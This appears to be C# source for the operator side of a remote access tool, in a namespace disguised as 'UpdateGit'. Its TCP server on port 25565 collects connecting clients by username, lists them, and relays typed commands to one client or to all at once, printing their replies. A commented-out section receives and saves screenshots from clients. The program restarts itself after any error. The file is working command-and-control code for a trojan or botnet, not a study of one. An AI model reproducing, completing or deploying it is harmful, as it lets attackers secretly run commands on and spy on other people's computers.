﻿using Microsoft.Win32;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.Net.Sockets;
using System.Text;
using static System.Net.Mime.MediaTypeNames;

namespace UpdateGit 
{
    class Program 
    {
      
        static void Main()
        {
        A:
            try
            {
                /////////////
                void Error_Read(string user)
                {
                    Console.WriteLine("Error Read");
                    //clients.Remove(user);
                }
                void Error_Write(string user)
                {
                    Console.WriteLine("Error Write");
                    // clients.Remove(user);
                }
                bool WriteU(Stream stream, string text, string user)
                {
                    bool error = false;
                    try
                    {
                        byte[] buffer = Encoding.UTF8.GetBytes(text);
                        stream.Write(buffer, 0, buffer.Length);
                        stream.Flush();
                    }
                    catch
                    {
                        Error_Write(user);
                        error = true;
                    }
                    return error;
                }
                void Write(Stream stream, string text)
                {
                    try
                    {
                        byte[] buffer = Encoding.UTF8.GetBytes(text);
                        stream.Write(buffer, 0, buffer.Length);
                        stream.Flush();
                    }
                    catch
                    {

                    }
                }
                string Read(Stream stream)
                {

                    string requst = "null";
                    try
                    {
                        byte[] buffer = new byte[10024];
                        int size = stream.Read(buffer, 0, buffer.Length);
                        requst = Encoding.UTF8.GetString(buffer, 0, size);
                    }
                    catch
                    {

                    }
                    return requst;
                }
                string ReadU(Stream stream, string user)
                {

                    string requst = "null";
                    try
                    {
                        byte[] buffer = new byte[30024];
                        int size = stream.Read(buffer, 0, buffer.Length);
                        requst = Encoding.UTF8.GetString(buffer, 0, size);
                    }
                    catch
                    {
                        Error_Read(user);
                    }
                    return requst;
                }
                bool isconected = false;
                bool CheckConnect(Stream stream)
                {
                    bool requst = false;
                    string test = "test";
                    Write(stream, test);
                    string answer_test = Read(stream);
                    if (answer_test == "test")
                    {
                        requst = true;
                    }
                    isconected = requst;
                    return requst;
                }
                Dictionary<string, TcpClient> clients = new Dictionary<string, TcpClient>();
                void ThreadingClient(object obj)
                {
                    TcpClient client = obj as TcpClient;
                    Stream stream = client.GetStream();
                    Write(stream, "username");
                    string username = Read(stream);
                    Console.WriteLine("client connected "+username);
                    if (!clients.ContainsKey(username))
                    {
                        clients.Add(username, client);
                    }
                    while (true)
                    {

                    }

                }
                string host = "127.0.0.1";
                int port = 25565;
                void ThreadingServer()
                {
                    using (TcpListener server = new TcpListener(IPAddress.Any, port))
                    {
                        server.Start();
                        while (true)
                        {
                            TcpClient client = server.AcceptTcpClient();
                            
                            new Thread(ThreadingClient).Start(client);
                        }
                    }
                }

                string ServerCommands(string command)
                {
                    string[] helper = { "ul", "help", "connect", "clear", "hide", "connectall" };
                    string requst = "null";
                    command = command.ToLower().Trim();
                    switch (command)
                    {
                        case "clear":
                            Console.Clear();
                            requst = "clear";
                            break;
                        case "ul":
                            requst = "";
                            foreach (var user in clients)
                            {
                                CheckConnect(user.Value.GetStream());

                                requst += $"Server: username - {user.Key};\n";
                            }
                            if (clients.Count == 0)
                                requst = "there are no connected users";
                            break;
                        case "connect":
                            Console.WriteLine("Input usernaem for connection");
                            string username = Console.ReadLine();
                            if (clients.ContainsKey(username))
                            {
                                TcpClient client = clients[username];

                                Stream stream = client.GetStream();

                                while (true)
                                {
                                    bool error;
                                    Console.WriteLine("Input command for client");
                                    Console.ResetColor();
                                    string _command = Console.ReadLine();
                                    if (_command?.Trim().Length > 0 && command != null)
                                    {

                                       /* if (_command.Trim()== "screenshot") 
                                        {
                                            string answer2 = ReadU(stream, username);
                                            int ind2 = 0;
                                            byte[] arr2 = new byte[answer2.Length];
                                            if (arr2.Length>128) {
                                                try
                                                {
                                                    string[] arrtext = answer2.Split(",");
                                                    foreach (var i in arrtext)
                                                    {

                                                        arr2[ind2] = Convert.ToByte(i);
                                                        ind2++;
                                                    }
                                                    using (MemoryStream ms = new MemoryStream(arr2))
                                                    {
                                                        System.Drawing.Image image2 = System.Drawing.Image.FromStream(ms);
                                                        image2.Save("file.png", ImageFormat.Png);
                                                    }
                                                
                                                }
                                            catch (Exception ex)
                                            {
                                                Console.ForegroundColor = ConsoleColor.Red;
                                                Console.WriteLine(ex.Message);
                                                Console.ResetColor();
                                            }
                                            }
                                            error = WriteU(stream, "okey", username);
                                        }*/
                                        if (_command.Trim() == "hide")
                                        {
                                            break;
                                        }
                                        if (_command.Trim() == "clear")
                                        {
                                            Console.Clear();
                                        }
                                        error = WriteU(stream, _command, username);
                                        string answer = ReadU(stream, username);
                                        Console.ForegroundColor = ConsoleColor.Blue;
                                        Console.WriteLine($"one Client {username} #################################################\n");
                                        Console.ForegroundColor = ConsoleColor.Green;
                                        Console.WriteLine(answer);
                                        //
                                        switch (answer)
                                        {
                                            //code answer

                                            case "clear":
                                                Console.Clear();
                                                requst = "clear";
                                                break;

                                            default: break;
                                        }

                                        //
                                        if (error)
                                            break;
                                    }
                                }


                            }
                            break;
                        case "help":
                            requst = "";
                            foreach (var i in helper)
                            {
                                requst += $"help command - {i};\n";

                            }

                            break;
                        default: requst = "the command was not found"; break;
                        case "connectall":

                            bool iswhile = true;
                            while (iswhile)
                            {
                                foreach (var i in clients)
                                {
                                    Console.WriteLine("Input command for client");
                                    Console.ResetColor();
                                    string _command = Console.ReadLine();
                                    if (_command?.Trim().Length > 0 && command != null)
                                    {


                                        if (_command.Trim() == "hide")
                                        {
                                            iswhile = false;
                                        }
                                        if (_command.Trim() == "clear")
                                        {
                                            Console.Clear();
                                        }
                                        bool error = WriteU(i.Value.GetStream(), _command, i.Key);
                                        string answer = ReadU(i.Value.GetStream(), i.Key);
                                        Console.ForegroundColor = ConsoleColor.Blue;
                                        Console.WriteLine($"multy Client {i.Key} #################################################\n");
                                        Console.ForegroundColor = ConsoleColor.Green;
                                        Console.WriteLine(answer);
                                        //
                                        switch (answer)
                                        {
                                            //code answer

                                            case "clear":
                                                Console.Clear();
                                                requst = "clear";
                                                break;

                                            default: break;
                                        }

                                        //
                                        if (error)
                                            break;
                                    }
                                }

                            }
                            break;
                    }
                    return requst;
                }
                void CheckConnectClient()
                {
                    while (true)
                    {
                        foreach (var i in clients)
                        {
                            if (CheckConnect(i.Value.GetStream()))
                            {

                            }
                            else
                            {
                                clients.Remove(i.Key);
                                Console.WriteLine("client closed "+i.Key);
                            }
                        }

                        Thread.Sleep(3000);
                    }
                }
                /////////////
               
                Console.Title = "Server";
                Thread t1 = new Thread(ThreadingServer);
                Thread t2 = new Thread(CheckConnectClient);
                t1.Start();
                Thread.Sleep(1000);
                t2.Start();
                while (true)
                {
                    string command = "null";
                    Console.WriteLine("Input command for server");

                    command = Console.ReadLine();

                    string answer = "null answer";
                    Console.ForegroundColor = ConsoleColor.Green;
                    if (command?.Trim().Length > 0 && command != null)
                    {
                        answer = ServerCommands(command);
                    }
                    Console.WriteLine(answer);
                    Console.ResetColor();
                }
                t2.Join();
                t1.Join();
            }
            catch 
            {
                goto A;
            }
        }
    }
}